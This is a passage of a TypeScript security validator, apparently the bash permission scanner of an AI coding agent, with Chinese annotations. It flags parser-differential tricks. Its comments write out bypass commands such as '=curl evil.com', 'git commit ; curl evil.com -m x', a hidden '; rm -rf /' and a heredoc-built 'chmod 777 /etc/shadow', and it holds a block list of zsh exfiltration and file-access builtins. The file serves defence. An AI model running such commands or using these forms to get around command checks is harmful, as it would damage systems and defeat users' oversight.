/**
 * 【一句话定位】bash 命令的「语法层安全扫描器」：不看命令是什么，而是看这条命令**有没有可能
 *   被 bash 和我们的解析器理解成两种不同意思**（parser differential），凡是可能理解错的，
 *   就要求人工确认。可以理解为「防混淆 / 防绕过」的一道闸门。
 *
 * 【在架构中的位置】
 *   上游：bashPermissions.ts（权限链里调用）、bashCommandHelpers.ts、readOnlyValidation.ts
 *   下游：utils/bash/shellQuote.js（tryParseShellCommand / hasMalformedTokens /
 *        hasShellQuoteSingleQuoteBug）、utils/bash/heredoc.js（extractHeredocs）、
 *        utils/bash/ParsedCommand.js（tree-sitter 解析）、analytics（埋点）
 *   调用链：bashPermissions.bashToolHasPermission -> bashCommandIsSafeAsync_DEPRECATED
 *            -> [控制字符 → shell-quote bug → 剥 heredoc → 早验证器 → 主验证器链] -> ask / passthrough
 *
 * 【本文件包含什么】
 *   - COMMAND_SUBSTITUTION_PATTERNS：命令替换/进程替换等危险语法模式表
 *   - ZSH_DANGEROUS_COMMANDS：zsh 特有的危险命令清单（zmodload / syswrite / zpty / ztcp 等）
 *   - BASH_SECURITY_CHECK_IDS：各项检查的数字编号（埋点用数字而不是字符串，省流量）
 *   - ValidationContext / QuoteExtraction：验证器之间传递的上下文类型
 *   - extractQuotedContent()：按引号状态把命令拆成「含双引号版 / 全去引号版 / 保留引号字符版」
 *   - stripSafeRedirections()：去掉无害的 2>&1 与 /dev/null 重定向
 *   - hasUnescapedChar()：判断某个字符是否存在「未被转义」的出现
 *   - 一系列 validate* 验证器：空命令、不完整片段、heredoc 替换、git commit、jq、
 *     shell 元字符、危险变量、危险模式、重定向、换行、回车、IFS 注入、/proc/environ、
 *     畸形 token、混淆 flag、反斜杠转义空白/操作符、Unicode 空白、词中 #、注释引号失同步、
 *     引号内换行、花括号展开、zsh 危险命令
 *   - bashCommandIsSafe_DEPRECATED() / bashCommandIsSafeAsync_DEPRECATED()：两个对外主入口
 *
 * 【核心设计思想：为什么要写这么多「奇怪」的检查】
 *   Claude Code 用 JS 的 shell-quote（或 tree-sitter）去理解一条 bash 命令，然后据此判权限；
 *   但**真正执行**它的是 bash。只要两者的理解有任何差异，攻击者就能构造出
 *   「校验器看着安全、bash 执行起来危险」的命令。本文件的每一项检查，几乎都对应一个
 *   真实发现的差异案例（英文注释里大量记录了攻击串）。所以读这个文件时，
 *   每个 validate* 都可以问一句：「它防的是哪一种解析器差异？」
 *
 * 【结论的两种形态】
 *   - ask + isBashSecurityCheckForMisparsing=true：属于「解析器理解不一致」，在权限链最前面直接拦下
 *   - ask（不带该标记）：只是可疑（如重定向），交给标准权限流程处理
 *   - passthrough：没发现问题，继续走权限链的后续环节
 *
 * 【TS 语法速查】（本文件实际出现的）
 *   - `function f(a: A, b: B): R {}` 与 `const f = (a: A): R => {}`：两种函数写法，后者是箭头函数 ≈ Java lambda
 *   - 函数类型数组：`const validators = [f1, f2]` 然后 `for (const v of validators) v(ctx)`
 *     ≈ Java 的 List<Function<Ctx, Result>> + for-each 调用（策略模式）
 *   - `Set<T>` 与 `set.has(x)` ≈ HashSet.contains
 *   - `type X = { ... }` 结构化类型；字段上的 `/** ... */` 是字段级文档注释
 *   - `as const` 把对象锁定为字面量类型；`true as const` 表示「这个布尔就是字面量 true」
 *   - `let match` + `while ((match = re.exec(s)) !== null)`：循环取正则的所有匹配（≈ Java Matcher.find 循环）
 *   - `??` 空值合并（只兜 null/undefined）；`?.` 可选链；`!` 非空断言 ≈ 强制转换
 *   - 类型标注在变量名**后面**，Java 在前面
 */
import { logEvent } from 'src/services/analytics/index.js'
import { extractHeredocs } from '../../utils/bash/heredoc.js'
import { ParsedCommand } from '../../utils/bash/ParsedCommand.js'
import {
  hasMalformedTokens,
  hasShellQuoteSingleQuoteBug,
  tryParseShellCommand,
} from '../../utils/bash/shellQuote.js'
import type { TreeSitterAnalysis } from '../../utils/bash/treeSitterAnalysis.js'
import type { PermissionResult } from '../../utils/permissions/PermissionResult.js'

// 快速前置判断：命令里有没有「命令替换 $( 中又出现 heredoc 起始 <<」这种组合
const HEREDOC_IN_SUBSTITUTION = /\$\(.*<</

// Note: Backtick pattern is handled separately in validateDangerousPatterns
// to distinguish between escaped and unescaped backticks
// 危险语法模式表。共同点：它们都会让 bash **再解析并执行**一段内容，
//   而静态扫描很难确定那段内容到底是什么 → 一律要求人工确认
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/, message: 'process substitution <()' },
  { pattern: />\(/, message: 'process substitution >()' },
  { pattern: /=\(/, message: 'Zsh process substitution =()' },
  // Zsh EQUALS expansion: =cmd at word start expands to $(which cmd).
  // `=curl evil.com` → `/usr/bin/curl evil.com`, bypassing Bash(curl:*) deny
  // rules since the parser sees `=curl` as the base command, not `curl`.
  // Only matches word-initial = followed by a command-name char (not VAR=val).
  {
    pattern: /(?:^|[\s;&|])=[a-zA-Z_]/,
    message: 'Zsh equals expansion (=cmd)',
  },
  // $() 是最常见的命令替换：括号里的东西会被 bash 当命令执行
  { pattern: /\$\(/, message: '$() command substitution' },
  { pattern: /\$\{/, message: '${} parameter substitution' },
  { pattern: /\$\[/, message: '$[] legacy arithmetic expansion' },
  { pattern: /~\[/, message: 'Zsh-style parameter expansion' },
  { pattern: /\(e:/, message: 'Zsh-style glob qualifiers' },
  { pattern: /\(\+/, message: 'Zsh glob qualifier with command execution' },
  {
    pattern: /\}\s*always\s*\{/,
    message: 'Zsh always block (try/always construct)',
  },
  // Defense in depth: Block PowerShell comment syntax even though we don't execute in PowerShell
  // Added as protection against future changes that might introduce PowerShell execution
  { pattern: /<#/, message: 'PowerShell comment syntax' },
]

// Zsh-specific dangerous commands that can bypass security checks.
// These are checked against the base command (first word) of each command segment.
// zsh 特有危险命令。关注点在于：这些命令能绕开「按可执行文件名做检查」的机制——
//   比如 zmodload 加载模块后，rm/mv/chmod 变成 shell 内建命令，不再是 /bin/rm 那个二进制文件
const ZSH_DANGEROUS_COMMANDS = new Set([
  // zmodload is the gateway to many dangerous module-based attacks:
  // zsh/mapfile (invisible file I/O via array assignment),
  // zsh/system (sysopen/syswrite two-step file access),
  // zsh/zpty (pseudo-terminal command execution),
  // zsh/net/tcp (network exfiltration via ztcp),
  // zsh/files (builtin rm/mv/ln/chmod that bypass binary checks)
  'zmodload',
  // emulate with -c flag is an eval-equivalent that executes arbitrary code
  'emulate',
  // Zsh module builtins that enable dangerous operations.
  // These require zmodload first, but we block them as defense-in-depth
  // in case zmodload is somehow bypassed or the module is pre-loaded.
  'sysopen', // Opens files with fine-grained control (zsh/system)
  'sysread', // Reads from file descriptors (zsh/system)
  'syswrite', // Writes to file descriptors (zsh/system)
  'sysseek', // Seeks on file descriptors (zsh/system)
  'zpty', // Executes commands on pseudo-terminals (zsh/zpty)
  'ztcp', // Creates TCP connections for exfiltration (zsh/net/tcp)
  'zsocket', // Creates Unix/TCP sockets (zsh/net/socket)
  'mapfile', // Not actually a command, but the associative array is set via zmodload
  'zf_rm', // Builtin rm from zsh/files
  'zf_mv', // Builtin mv from zsh/files
  'zf_ln', // Builtin ln from zsh/files
  'zf_chmod', // Builtin chmod from zsh/files
  'zf_chown', // Builtin chown from zsh/files
  'zf_mkdir', // Builtin mkdir from zsh/files
  'zf_rmdir', // Builtin rmdir from zsh/files
  'zf_chgrp', // Builtin chgrp from zsh/files
])

// Numeric identifiers for bash security checks (to avoid logging strings)
// 用数字而不是字符串做埋点标识：上报体积小、也避免把内部检查名暴露在日志里
const BASH_SECURITY_CHECK_IDS = {
  INCOMPLETE_COMMANDS: 1,
  JQ_SYSTEM_FUNCTION: 2,
  JQ_FILE_ARGUMENTS: 3,
  OBFUSCATED_FLAGS: 4,
  SHELL_METACHARACTERS: 5,
  DANGEROUS_VARIABLES: 6,
  NEWLINES: 7,
  DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,
  DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,
  DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10,
  IFS_INJECTION: 11,
  GIT_COMMIT_SUBSTITUTION: 12,
  PROC_ENVIRON_ACCESS: 13,
  MALFORMED_TOKEN_INJECTION: 14,
  BACKSLASH_ESCAPED_WHITESPACE: 15,
  BRACE_EXPANSION: 16,
  CONTROL_CHARACTERS: 17,
  UNICODE_WHITESPACE: 18,
  MID_WORD_HASH: 19,
  ZSH_DANGEROUS_COMMANDS: 20,
  BACKSLASH_ESCAPED_OPERATORS: 21,
  COMMENT_QUOTE_DESYNC: 22,
  QUOTED_NEWLINE: 23,
} as const

// 所有验证器共用的上下文。注意它准备了**多个版本**的命令文本：
//   unquotedContent（去单引号、留双引号内容）、fullyUnquoted（全去引号）、
//   fullyUnquotedPreStrip（去掉安全重定向之前）、unquotedKeepQuoteChars（去内容但留引号字符）。
//   为什么要这么多版本：不同检查关心的东西不一样；而「先做了某种清洗」本身也可能被利用
type ValidationContext = {
  originalCommand: string
  baseCommand: string
  unquotedContent: string
  fullyUnquotedContent: string
  /** fullyUnquoted before stripSafeRedirections — used by validateBraceExpansion
   * to avoid false negatives from redirection stripping creating backslash adjacencies */
  fullyUnquotedPreStrip: string
  /** Like fullyUnquotedPreStrip but preserves quote characters ('/"): e.g.,
   * echo 'x'# → echo ''# (the quote chars remain, revealing adjacency to #) */
  unquotedKeepQuoteChars: string
  /** Tree-sitter analysis data, if available. Validators can use this for
   * more accurate analysis when present, falling back to regex otherwise. */
  treeSitter?: TreeSitterAnalysis | null
}

type QuoteExtraction = {
  withDoubleQuotes: string
  fullyUnquoted: string
  /** Like fullyUnquoted but preserves quote characters ('/"): strips quoted
   * content while keeping the delimiters. Used by validateMidWordHash to detect
   * quote-adjacent # (e.g., 'x'# where quote stripping would hide adjacency). */
  unquotedKeepQuoteChars: string
}

/**
 * 【做什么】逐字符扫描，同时产出三种「去引号」结果
 * 【为什么需要】很多检查只在「引号外」的内容上才有意义（引号里的 ; 不是命令分隔符）
 * 【入参】command：命令原文；isJq：jq 命令要保留双引号内容（jq 的过滤器常写在双引号里）
 * 【返回】{ withDoubleQuotes, fullyUnquoted, unquotedKeepQuoteChars }
 * 【关键步骤】
 *   ① 维护 inSingleQuote / inDoubleQuote / escaped 三个状态
 *   ② **单引号内的反斜杠是字面量**，不能当转义符（bash 的规则，也是踩过的坑）
 *   ③ 单引号内一律当字面量；双引号内容按是否 isJq 决定保留与否
 */
function extractQuotedContent(command: string, isJq = false): QuoteExtraction {
  let withDoubleQuotes = ''
  let fullyUnquoted = ''
  let unquotedKeepQuoteChars = ''
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false

  for (let i = 0; i < command.length; i++) {
    const char = command[i]

    if (escaped) {
      escaped = false
      if (!inSingleQuote) withDoubleQuotes += char
      if (!inSingleQuote && !inDoubleQuote) fullyUnquoted += char
      if (!inSingleQuote && !inDoubleQuote) unquotedKeepQuoteChars += char
      continue
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true
      if (!inSingleQuote) withDoubleQuotes += char
      if (!inSingleQuote && !inDoubleQuote) fullyUnquoted += char
      if (!inSingleQuote && !inDoubleQuote) unquotedKeepQuoteChars += char
      continue
    }

    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      unquotedKeepQuoteChars += char
      continue
    }

    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      unquotedKeepQuoteChars += char
      // For jq, include quotes in extraction to ensure content is properly analyzed
      if (!isJq) continue
    }

    if (!inSingleQuote) withDoubleQuotes += char
    if (!inSingleQuote && !inDoubleQuote) fullyUnquoted += char
    if (!inSingleQuote && !inDoubleQuote) unquotedKeepQuoteChars += char
  }

  return { withDoubleQuotes, fullyUnquoted, unquotedKeepQuoteChars }
}

/**
 * 【做什么】把确定无害的重定向（2>&1、> /dev/null、< /dev/null）从文本里去掉
 * 【为什么需要】它们是极其常见的写法，不去会让后面的「有无重定向」检查误报
 * 【安全点】三条正则**必须**带尾部边界 (?=\s|$)：否则 `> /dev/nullo` 会被当成
 *   `> /dev/null` + 残留的 `o`，命令在校验器眼里就没有重定向了（真实事故）
 */
function stripSafeRedirections(content: string): string {
  // SECURITY: All three patterns MUST have a trailing boundary (?=\s|$).
  // Without it, `> /dev/nullo` matches `/dev/null` as a PREFIX, strips
  // `> /dev/null` leaving `o`, so `echo hi > /dev/nullo` becomes `echo hi o`.
  // validateRedirections then sees no `>` and passes. The file write to
  // /dev/nullo is auto-allowed via the read-only path (checkReadOnlyConstraints).
  // Main bashPermissions flow is protected (checkPathConstraints validates the
  // original command), but speculation.ts uses checkReadOnlyConstraints alone.
  return content
    .replace(/\s+2\s*>&\s*1(?=\s|$)/g, '')
    .replace(/[012]?\s*>\s*\/dev\/null(?=\s|$)/g, '')
    .replace(/\s*<\s*\/dev\/null(?=\s|$)/g, '')
}

/**
 * Checks if content contains an unescaped occurrence of a single character.
 * Handles bash escape sequences correctly where a backslash escapes the following character.
 *
 * IMPORTANT: This function only handles single characters, not strings. If you need to extend
 * this to handle multi-character strings, be EXTREMELY CAREFUL about shell ANSI-C quoting
 * (e.g., $'\n', $'\x41', $'\u0041') which can encode arbitrary characters and strings in ways
 * that are very difficult to parse correctly. Incorrect handling could introduce security
 * vulnerabilities by allowing attackers to bypass security checks.
 *
 * @param content - The string to search (typically from extractQuotedContent)
 * @param char - Single character to search for (e.g., '`')
 * @returns true if unescaped occurrence found, false otherwise
 *
 * Examples:
 *   hasUnescapedChar("test \`safe\`", '`') → false (escaped backticks)
 *   hasUnescapedChar("test `dangerous`", '`') → true (unescaped backticks)
 *   hasUnescapedChar("test\\`date`", '`') → true (escaped backslash + unescaped backtick)
 */
/**
 * 【做什么】判断内容里是否存在「未被反斜杠转义」的指定字符
 * 【为什么需要】反引号是最典型的例子：`\`` 是字面反引号（SQL 里常用），`` `date` `` 才是命令替换
 * 【入参】content：待查文本；char：**单个字符**
 * 【返回】true = 存在未转义的出现
 * 【注意】只支持单字符。多字符会涉及 bash 的 ANSI-C 引用（$'\x41' 之类），
 *   那类写法能把任意字符编码出来，处理不当就会引入漏洞，所以这里刻意不支持
 */
function hasUnescapedChar(content: string, char: string): boolean {
  if (char.length !== 1) {
    throw new Error('hasUnescapedChar only works with single characters')
  }

  let i = 0
  while (i < content.length) {
    // If we see a backslash, skip it and the next character (they form an escape sequence)
    if (content[i] === '\\' && i + 1 < content.length) {
      i += 2 // Skip backslash and escaped character
      continue
    }

    // Check if current character matches
    if (content[i] === char) {
      return true // Found unescaped occurrence
    }

    i++
  }

  return false // No unescaped occurrences found
}

// 空命令：没有任何风险，直接放行（也可以避免后面一堆正则做无意义的扫描）
function validateEmpty(context: ValidationContext): PermissionResult {
  if (!context.originalCommand.trim()) {
    return {
      behavior: 'allow',
      updatedInput: { command: context.originalCommand },
      decisionReason: { type: 'other', reason: 'Empty command is safe' },
    }
  }
  return { behavior: 'passthrough', message: 'Command is not empty' }
}

/**
 * 【做什么】识别「看起来像命令碎片」的输入（以 tab 开头、以 - 开头、以操作符开头）
 * 【为什么需要】这类输入通常是多行命令被拆开后的一段，单独看语义不完整，
 *   放行等于在未知上下文里执行，必须让人看一眼
 */
function validateIncompleteCommands(
  context: ValidationContext,
): PermissionResult {
  const { originalCommand } = context
  const trimmed = originalCommand.trim()

  if (/^\s*\t/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.INCOMPLETE_COMMANDS,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: 'Command appears to be an incomplete fragment (starts with tab)',
    }
  }

  if (trimmed.startsWith('-')) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.INCOMPLETE_COMMANDS,
      subId: 2,
    })
    return {
      behavior: 'ask',
      message:
        'Command appears to be an incomplete fragment (starts with flags)',
    }
  }

  if (/^\s*(&&|\|\||;|>>?|<)/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.INCOMPLETE_COMMANDS,
      subId: 3,
    })
    return {
      behavior: 'ask',
      message:
        'Command appears to be a continuation line (starts with operator)',
    }
  }

  return { behavior: 'passthrough', message: 'Command appears complete' }
}

/**
 * Checks if a command is a "safe" heredoc-in-substitution pattern that can
 * bypass the generic $() validator.
 *
 * This is an EARLY-ALLOW path: returning `true` causes bashCommandIsSafe to
 * return `passthrough`, bypassing ALL subsequent validators. Given this
 * authority, the check must be PROVABLY safe, not "probably safe".
 *
 * The only pattern we allow is:
 *   [prefix] $(cat <<'DELIM'\n
 *   [body lines]\n
 *   DELIM\n
 *   ) [suffix]
 *
 * Where:
 * - The delimiter must be single-quoted ('DELIM') or escaped (\DELIM) so the
 *   body is literal text with no expansion
 * - The closing delimiter must be on a line BY ITSELF (or with only trailing
 *   whitespace + `)` for the $(cat <<'EOF'\n...\nEOF)` inline form)
 * - The closing delimiter must be the FIRST such line — matching bash's
 *   behavior exactly (no skipping past early delimiters to find EOF))
 * - There must be non-whitespace text BEFORE the $( (i.e., the substitution
 *   is used in argument position, not as a command name). Otherwise the
 *   heredoc body becomes an arbitrary command name with [suffix] as args.
 * - The remaining text (with the heredoc stripped) must pass all validators
 *
 * This implementation uses LINE-BASED matching, not regex [\s\S]*?, to
 * precisely replicate bash's heredoc-closing behavior.
 */
/**
 * 【做什么】判断命令里的 $(cat <<'DELIM' ... DELIM) 是否**可证明**安全
 * 【为什么需要】heredoc 是合法且常用的写法（把多行文本喂给命令），不该一律拦；
 *   但它是「早放行」路径（一旦判安全就跳过后面所有验证器），所以标准必须极严
 * 【返回】true = 可以早放行
 * 【关键步骤】
 *   ① 分隔符必须是单引号或反斜杠转义过的（保证正文是字面文本，不会被展开）
 *   ② 用**按行**匹配找结束分隔符，精确复刻 bash 的「第一个匹配行就结束」行为
 *      （用正则 [\s\S]*? 会跳到后面的分隔符，从而把中间夹带的命令藏起来）
 *   ③ 拒绝嵌套匹配（外层引号 heredoc 里的内层只是字面文本，剥离会打乱下标）
 *   ④ $() 必须在**参数位置**而不是命令名位置，否则 heredoc 正文会变成要执行的命令名
 *   ⑤ 剥掉 heredoc 后的剩余文本必须只含安全字符，且**再跑一遍完整验证**
 */
function isSafeHeredoc(command: string): boolean {
  if (!HEREDOC_IN_SUBSTITUTION.test(command)) return false

  // SECURITY: Use [ \t] (not \s) between << and the delimiter. \s matches
  // newlines, but bash requires the delimiter word on the same line as <<.
  // Matching across newlines could accept malformed syntax that bash rejects.
  // Handle quote variations: 'EOF', ''EOF'' (splitCommand may mangle quotes).
  const heredocPattern =
    /\$\(cat[ \t]*<<(-?)[ \t]*(?:'+([A-Za-z_]\w*)'+|\\([A-Za-z_]\w*))/g
  let match
  type HeredocMatch = {
    start: number
    operatorEnd: number
    delimiter: string
    isDash: boolean
  }
  const safeHeredocs: HeredocMatch[] = []

  while ((match = heredocPattern.exec(command)) !== null) {
    const delimiter = match[2] || match[3]
    if (delimiter) {
      safeHeredocs.push({
        start: match.index,
        operatorEnd: match.index + match[0].length,
        delimiter,
        isDash: match[1] === '-',
      })
    }
  }

  // If no safe heredoc patterns found, it's not safe
  if (safeHeredocs.length === 0) return false

  // SECURITY: For each heredoc, find the closing delimiter using LINE-BASED
  // matching that exactly replicates bash's behavior. Bash closes a heredoc
  // at the FIRST line that exactly matches the delimiter. Any subsequent
  // occurrence of the delimiter is just content (or a new command). Regex
  // [\s\S]*? can skip past the first delimiter to find a later `DELIM)`
  // pattern, hiding injected commands between the two delimiters.
  type VerifiedHeredoc = { start: number; end: number }
  const verified: VerifiedHeredoc[] = []

  for (const { start, operatorEnd, delimiter, isDash } of safeHeredocs) {
    // The opening line must end immediately after the delimiter (only
    // horizontal whitespace allowed before the newline). If there's other
    // content (like `; rm -rf /`), this is not a simple safe heredoc.
    const afterOperator = command.slice(operatorEnd)
    const openLineEnd = afterOperator.indexOf('\n')
    if (openLineEnd === -1) return false // No content at all
    const openLineTail = afterOperator.slice(0, openLineEnd)
    if (!/^[ \t]*$/.test(openLineTail)) return false // Extra content on open line

    // Body starts after the newline
    const bodyStart = operatorEnd + openLineEnd + 1
    const body = command.slice(bodyStart)
    const bodyLines = body.split('\n')

    // Find the FIRST line that closes the heredoc. There are two valid forms:
    //   1. `DELIM` alone on a line (bash-standard), followed by `)` on the
    //      next line (with only whitespace before it)
    //   2. `DELIM)` on a line (the inline $(cat <<'EOF'\n...\nEOF) form,
    //      where bash's PST_EOFTOKEN closes both heredoc and substitution)
    // For <<-, leading tabs are stripped before matching.
    let closingLineIdx = -1
    let closeParenLineIdx = -1 // Line index where `)` appears
    let closeParenColIdx = -1 // Column index of `)` on that line

    for (let i = 0; i < bodyLines.length; i++) {
      const rawLine = bodyLines[i]!
      const line = isDash ? rawLine.replace(/^\t*/, '') : rawLine

      // Form 1: delimiter alone on a line
      if (line === delimiter) {
        closingLineIdx = i
        // The `)` must be on the NEXT line with only whitespace before it
        const nextLine = bodyLines[i + 1]
        if (nextLine === undefined) return false // No closing `)`
        const parenMatch = nextLine.match(/^([ \t]*)\)/)
        if (!parenMatch) return false // `)` not at start of next line
        closeParenLineIdx = i + 1
        closeParenColIdx = parenMatch[1]!.length // Position of `)`
        break
      }

      // Form 2: delimiter immediately followed by `)` (PST_EOFTOKEN form)
      // Only whitespace allowed between delimiter and `)`.
      if (line.startsWith(delimiter)) {
        const afterDelim = line.slice(delimiter.length)
        const parenMatch = afterDelim.match(/^([ \t]*)\)/)
        if (parenMatch) {
          closingLineIdx = i
          closeParenLineIdx = i
          // Column is in rawLine (pre-tab-strip), so recompute
          const tabPrefix = isDash ? (rawLine.match(/^\t*/)?.[0] ?? '') : ''
          closeParenColIdx =
            tabPrefix.length + delimiter.length + parenMatch[1]!.length
          break
        }
        // Line starts with delimiter but has other trailing content —
        // this is NOT the closing line (bash requires exact match or EOF`)`).
        // But it's also a red flag: if this were inside $(), bash might
        // close early via PST_EOFTOKEN with other shell metacharacters.
        // We already handle that case in extractHeredocs — here we just
        // reject it as not matching our safe pattern.
        if (/^[)}`|&;(<>]/.test(afterDelim)) {
          return false // Ambiguous early-closure pattern
        }
      }
    }

    if (closingLineIdx === -1) return false // No closing delimiter found

    // Compute the absolute end position (one past the `)` character)
    let endPos = bodyStart
    for (let i = 0; i < closeParenLineIdx; i++) {
      endPos += bodyLines[i]!.length + 1 // +1 for newline
    }
    endPos += closeParenColIdx + 1 // +1 to include the `)` itself

    verified.push({ start, end: endPos })
  }

  // SECURITY: Reject nested matches. The regex finds $(cat <<'X' patterns
  // in RAW TEXT without understanding quoted-heredoc semantics. When the
  // outer heredoc has a quoted delimiter (<<'A'), its body is LITERAL text
  // in bash — any inner $(cat <<'B' is just characters, not a real heredoc.
  // But our regex matches both, producing NESTED ranges. Stripping nested
  // ranges corrupts indices: after stripping the inner range, the outer
  // range's `end` is stale (points past the shrunken string), causing
  // `remaining.slice(end)` to return '' and silently drop any suffix
  // (e.g., `; rm -rf /`). Since all our matched heredocs have quoted/escaped
  // delimiters, a nested match inside the body is ALWAYS literal text —
  // no legitimate user writes this pattern. Bail to safe fallback.
  for (const outer of verified) {
    for (const inner of verified) {
      if (inner === outer) continue
      if (inner.start > outer.start && inner.start < outer.end) {
        return false
      }
    }
  }

  // Strip all verified heredocs from the command, building `remaining`.
  // Process in reverse order so earlier indices stay valid.
  const sortedVerified = [...verified].sort((a, b) => b.start - a.start)
  let remaining = command
  for (const { start, end } of sortedVerified) {
    remaining = remaining.slice(0, start) + remaining.slice(end)
  }

  // SECURITY: The remaining text must NOT start with only whitespace before
  // the (now-stripped) heredoc position IF there's non-whitespace after it.
  // If the $() is in COMMAND-NAME position (no prefix), its output becomes
  // the command to execute, with any suffix text as arguments:
  //   $(cat <<'EOF'\nchmod\nEOF\n) 777 /etc/shadow
  //   → runs `chmod 777 /etc/shadow`
  // We only allow the substitution in ARGUMENT position: there must be a
  // command word before the $(.
  // After stripping, `remaining` should look like `cmd args... [more args]`.
  // If remaining starts with only whitespace (or is empty), the $() WAS the
  // command — that's only safe if there are no trailing arguments.
  const trimmedRemaining = remaining.trim()
  if (trimmedRemaining.length > 0) {
    // There's a prefix command — good. But verify the original command
    // also had a non-whitespace prefix before the FIRST $( (the heredoc
    // could be one of several; we need the first one's prefix).
    const firstHeredocStart = Math.min(...verified.map(v => v.start))
    const prefix = command.slice(0, firstHeredocStart)
    if (prefix.trim().length === 0) {
      // $() is in command-name position but there's trailing text — UNSAFE.
      // The heredoc body becomes the command name, trailing text becomes args.
      return false
    }
  }

  // Check that remaining text contains only safe characters.
  // After stripping safe heredocs, the remaining text should only be command
  // names, arguments, quotes, and whitespace. Reject ANY shell metacharacter
  // to prevent operators (|, &, &&, ||, ;) or expansions ($, `, {, <, >) from
  // being used to chain dangerous commands after a safe heredoc.
  // SECURITY: Use explicit ASCII space/tab only — \s matches unicode whitespace
  // like \u00A0 which can be used to hide content. Newlines are also blocked
  // (they would indicate multi-line commands outside the heredoc body).
  if (!/^[a-zA-Z0-9 \t"'.\-/_@=,:+~]*$/.test(remaining)) return false

  // SECURITY: The remaining text (command with heredocs stripped) must also
  // pass all security validators. Without this, appending a safe heredoc to a
  // dangerous command (e.g., `zmodload zsh/system $(cat <<'EOF'\nx\nEOF\n)`)
  // causes this early-allow path to return passthrough, bypassing
  // validateZshDangerousCommands, validateProcEnvironAccess, and any other
  // main validator that checks allowlist-safe character patterns.
  // No recursion risk: `remaining` has no `$(... <<` pattern, so the recursive
  // call's validateSafeCommandSubstitution returns passthrough immediately.
  if (bashCommandIsSafe_DEPRECATED(remaining).behavior !== 'passthrough')
    return false

  return true
}

/**
 * Detects well-formed $(cat <<'DELIM'...DELIM) heredoc substitution patterns.
 * Returns the command with matched heredocs stripped, or null if none found.
 * Used by the pre-split gate to strip safe heredocs and re-check the remainder.
 */
// 与 isSafeHeredoc 类似，但它返回「剥掉 heredoc 之后的命令」而不是布尔值，
//   供上层「先剥再重新校验剩余部分」的流程使用；没找到则返回 null
export function stripSafeHeredocSubstitutions(command: string): string | null {
  if (!HEREDOC_IN_SUBSTITUTION.test(command)) return null

  const heredocPattern =
    /\$\(cat[ \t]*<<(-?)[ \t]*(?:'+([A-Za-z_]\w*)'+|\\([A-Za-z_]\w*))/g
  let result = command
  let found = false
  let match
  const ranges: Array<{ start: number; end: number }> = []
  while ((match = heredocPattern.exec(command)) !== null) {
    if (match.index > 0 && command[match.index - 1] === '\\') continue
    const delimiter = match[2] || match[3]
    if (!delimiter) continue
    const isDash = match[1] === '-'
    const operatorEnd = match.index + match[0].length

    const afterOperator = command.slice(operatorEnd)
    const openLineEnd = afterOperator.indexOf('\n')
    if (openLineEnd === -1) continue
    if (!/^[ \t]*$/.test(afterOperator.slice(0, openLineEnd))) continue

    const bodyStart = operatorEnd + openLineEnd + 1
    const bodyLines = command.slice(bodyStart).split('\n')
    for (let i = 0; i < bodyLines.length; i++) {
      const rawLine = bodyLines[i]!
      const line = isDash ? rawLine.replace(/^\t*/, '') : rawLine
      if (line.startsWith(delimiter)) {
        const after = line.slice(delimiter.length)
        let closePos = -1
        if (/^[ \t]*\)/.test(after)) {
          const lineStart =
            bodyStart +
            bodyLines.slice(0, i).join('\n').length +
            (i > 0 ? 1 : 0)
          closePos = command.indexOf(')', lineStart)
        } else if (after === '') {
          const nextLine = bodyLines[i + 1]
          if (nextLine !== undefined && /^[ \t]*\)/.test(nextLine)) {
            const nextLineStart =
              bodyStart + bodyLines.slice(0, i + 1).join('\n').length + 1
            closePos = command.indexOf(')', nextLineStart)
          }
        }
        if (closePos !== -1) {
          ranges.push({ start: match.index, end: closePos + 1 })
          found = true
        }
        break
      }
    }
  }
  if (!found) return null
  for (let i = ranges.length - 1; i >= 0; i--) {
    const r = ranges[i]!
    result = result.slice(0, r.start) + result.slice(r.end)
  }
  return result
}

/** Detection-only check: does the command contain a safe heredoc substitution? */
// 纯探测：有没有可剥离的安全 heredoc（内部就是复用上面的函数判 null）
export function hasSafeHeredocSubstitution(command: string): boolean {
  return stripSafeHeredocSubstitutions(command) !== null
}

function validateSafeCommandSubstitution(
  context: ValidationContext,
): PermissionResult {
  const { originalCommand } = context

  if (!HEREDOC_IN_SUBSTITUTION.test(originalCommand)) {
    return { behavior: 'passthrough', message: 'No heredoc in substitution' }
  }

  if (isSafeHeredoc(originalCommand)) {
    return {
      behavior: 'allow',
      updatedInput: { command: originalCommand },
      decisionReason: {
        type: 'other',
        reason:
          'Safe command substitution: cat with quoted/escaped heredoc delimiter',
      },
    }
  }

  return {
    behavior: 'passthrough',
    message: 'Command substitution needs validation',
  }
}

/**
 * 【做什么】对 git commit -m '...' 这种高频命令做「早放行」判断
 * 【为什么需要】提交信息里常出现各种符号，走完整验证链容易误报；但早放行意味着跳过后续验证，
 *   所以必须把「可能被利用」的情形全部排除（英文注释里有完整的攻击串记录）
 * 【返回】allow（确实是简单的 git commit -m）/ passthrough（交给完整验证链）
 * 【关键步骤】
 *   ① 含反斜杠 → 直接 passthrough（反斜杠会扰乱引号边界判断，而正常提交信息几乎不含）
 *   ② 匹配 -m 及其后的引号内容；**-m 之前的部分不允许出现 ; & | ` $ < > 换行**
 *      （否则 `git commit ; curl evil.com -m 'x'` 会被当成一条合法提交放行）
 *   ③ 双引号消息里若含 $() / 反引号 / ${} → ask
 *   ④ 剩余部分若含 shell 操作符或未加引号的 < >（重定向）→ passthrough（交给 validateRedirections）
 *   ⑤ 消息以 - 开头 → ask（典型的混淆形态）
 */
function validateGitCommit(context: ValidationContext): PermissionResult {
  const { originalCommand, baseCommand } = context

  if (baseCommand !== 'git' || !/^git\s+commit\s+/.test(originalCommand)) {
    return { behavior: 'passthrough', message: 'Not a git commit' }
  }

